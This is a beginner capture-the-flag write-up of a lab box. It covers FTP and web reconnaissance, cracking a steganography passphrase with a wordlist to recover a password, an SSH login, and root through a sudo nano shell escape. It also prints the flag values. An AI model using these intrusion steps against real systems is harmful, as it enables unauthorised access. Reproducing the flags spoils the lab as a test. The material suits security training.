#CTF 

_This room is aimed for beginner level hackers but anyone can try to hack this box. There are two main intended ways to root the box._

## Recon

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.100.122
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

I log in to ftp as anonymous and find `note_to_jake.txt`

```
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```

The only thing I find in the webpage is a image and this at the bottom
```
This example creates a full page background image. Try to resize the browser window to see how it always will cover the full screen (when scrolled to top), and that it scales nicely on all screen sizes.
```

I download the image and I run exiftool

```
ExifTool Version Number         : 12.63
File Name                       : brooklyn99.jpg
Directory                       : .
File Size                       : 70 kB
File Modification Date/Time     : 2023:07:25 16:06:56-04:00
File Access Date/Time           : 2023:07:25 16:07:10-04:00
File Inode Change Date/Time     : 2023:07:25 16:06:56-04:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Image Width                     : 533
Image Height                    : 300
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 533x300
Megapixels                      : 0.160
```


## Access

I was looking online how to extract information from an image and I found stegseek

```
stegseek brooklyn99.jpg /usr/share/wordlists/rockyou.txt

StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
[i] Found passphrase: "admin"
[i] Original filename: "note.txt".
[i] Extracting to "brooklyn99.jpg.out".

```

and inside "brooklyn99.jpg.out"
```
Holts Password:
fluffydog12@ninenine

Enjoy!!
```

I ssh to holt and I am in!
`ee11cbb19052e40b07aac0ca060c23ee`


## Priv Esc

```
Matching Defaults entries for holt on brookly_nine_nine:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User holt may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /bin/nano

```

I search for nano on gtfo and find
```
sudo nano
^R^X
reset; sh 1>&0 2>&0
```

And I am root!
`63a9f0ea7bb98050796b649e85481845`